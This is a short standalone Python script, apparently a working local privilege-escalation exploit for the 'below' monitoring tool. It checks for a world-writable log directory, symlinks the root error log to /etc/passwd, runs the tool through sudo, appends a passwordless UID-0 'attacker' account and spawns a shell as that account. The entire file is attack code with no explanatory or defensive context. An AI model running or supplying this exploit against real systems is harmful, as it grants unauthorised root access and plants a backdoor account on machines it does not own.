#!/usr/bin/env python3
import os
import subprocess
import sys
import pty

B = "/usr/local/bin/below"
D = "/var/log/below"
L = f"{D}/error_root.log"
T = "/tmp/attacker"
P = "attacker::0:0:attacker:/root:/bin/bash\n"

def fail():
    sys.exit(1)

def vulnerable():
    if not os.path.exists(D):
        fail()
    if not (os.stat(D).st_mode & 0o002):
        fail()
    if os.path.exists(L):
        if os.path.islink(L):
            return True
        else:
            os.remove(L)
    try:
        os.symlink("/etc/passwd", L)
        os.remove(L)
        return True
    except:
        fail()

def exploit():
    try:
        with open(T, "w") as f:
            f.write(P)
    except:
        fail()

    if os.path.exists(L):
        os.remove(L)
    try:
        os.symlink("/etc/passwd", L)
    except:
        fail()

    try:
        subprocess.run(["sudo", B, "record"], timeout=40)
    except:
        pass

    try:
        with open(L, "a") as f:
            f.write(P)
    except:
        fail()

    try:
        pty.spawn(["su", "attacker"])
    except:
        fail()

def main():
    if vulnerable():
        exploit()

if __name__ == "__main__":
    main()
